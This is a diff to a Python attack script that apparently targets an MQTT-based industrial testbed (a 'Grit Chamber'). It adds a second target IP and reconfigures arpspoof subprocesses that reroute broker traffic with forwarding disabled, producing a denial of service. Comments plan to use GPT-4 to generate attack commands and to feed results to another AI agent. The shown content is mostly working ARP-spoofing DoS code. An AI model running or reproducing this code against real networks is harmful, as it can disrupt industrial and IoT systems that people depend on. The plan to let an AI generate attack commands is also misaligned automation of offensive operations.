@@ -14,7 +14,8 @@ from netfilterqueue import NetfilterQueue
 API_KEY = "Insert here"
 openai.api_key = API_KEY
 llm_model = "gpt-4"
-targetIP = "192.168.8.159" #TODO: Update with IP address of Grit Chamber
+targetIP = "192.168.8.160"
+targetIP2 = "192.168.8.145"
 brokerIP = "192.168.8.210"
 message = ""
 sniffed_topic = ""
@@ -59,13 +60,15 @@ def denial_of_service():
         os.system("sudo sysctl -w net.ipv4.ip_forward=0") 
         #TODO: Have AI generate this command
         #Reroutes packets from the MQTT server through this computer.
-        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, brokerIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", brokerIP, targetIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        nodeAttack2 = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", brokerIP, targetIP2], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         while True:
             time.sleep(5)
     #Kills the program when desired.
     except KeyboardInterrupt:
         print("Stopping DDOS process...")
         os.kill(nodeAttack.pid, signal.SIGTERM)
+        os.kill(nodeAttack2.pid, signal.SIGTERM)
 
 #TODO: Create a command that sends relevant attack information to the XR AI agent (Trenton).
 
